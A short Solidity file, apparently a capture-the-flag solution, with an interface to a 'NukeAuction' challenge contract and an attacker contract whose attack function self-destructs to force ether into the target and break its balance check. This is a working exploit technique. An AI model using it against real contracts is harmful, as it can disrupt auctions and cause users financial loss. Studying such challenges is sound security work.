pragma solidity ^0.8.13;

interface INukeAuction {
    function deposit() external payable;
    function claimAuction() external;
    function isAuctionSane() external view returns (bool);
    function getBalance() external view returns (uint);
    function isSolved() external view returns (bool);
}

contract NukeAuctionAttacker {
    function attack(address payable addr) public payable {
        selfdestruct(addr);
    }
}